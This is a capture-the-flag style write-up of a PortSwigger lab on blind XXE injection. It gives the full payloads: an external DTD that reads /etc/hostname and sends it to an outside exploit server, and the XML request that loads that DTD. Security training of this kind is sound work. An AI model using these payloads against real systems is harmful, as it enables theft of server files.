# Exploiting blind XXE to exfiltrate data using a malicious external DTD

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration), you'll learn: Exploiting blind XXE to exfiltrate data using a malicious external DTD! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225055641.png)

In previous labs, we found that **there is an XXE injection vulnerability in the "Check stock" feature, which parses XML input.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225055722.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225055739.png)

**Original XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225055849.png)

**Invalid XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>
```

As you can see, it doesn't display the response. Hence, this is a blind XXE injection.

To exploit that, we can **host a malicious DTD**(Document Type Definition) to exfiltrate target data.

**Let's use the exploit server to host an external DTD file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225060157.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225060259.png)

**Then, we can build our XXE payload:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a9500d303544494c05e3a7101f100d9.exploit-server.net/?data=%file;'>">
%eval;
%exfiltrate;
```

**The above DTD will:**

- Define an XML parameter entity called `file`, which contains the content of `/etc/hostname`
- Define an XML parameter entity called `eval`, which contains another dynamic declaration XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to our  exploit server containing the value of the `file` entity within the URL query string.
- Then, use the `eval` entity, which uses the dynamic declaration of the `exfiltrate` entity
- Finally, use the `exfiltrate`, which sends data to the exploit server

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225063029.png)

**Next, we can send an XXE payload, which fetches our external malicious DTD:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "https://exploit-0a9500d303544494c05e3a7101f100d9.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**The second line will:**

- Define an an XML parameter entity called `xxe`, which fetches our exploit server's malicious DTD and interpret it inline

**Let's send the above XXE payload!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225063037.png)

**Exploit server access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-5/images/Pasted%20image%2020221225063050.png)

We succesfully extracted the content of `/etc/hostname`!

# What we've learned:

1. Exploiting blind XXE to exfiltrate data using a malicious external DTD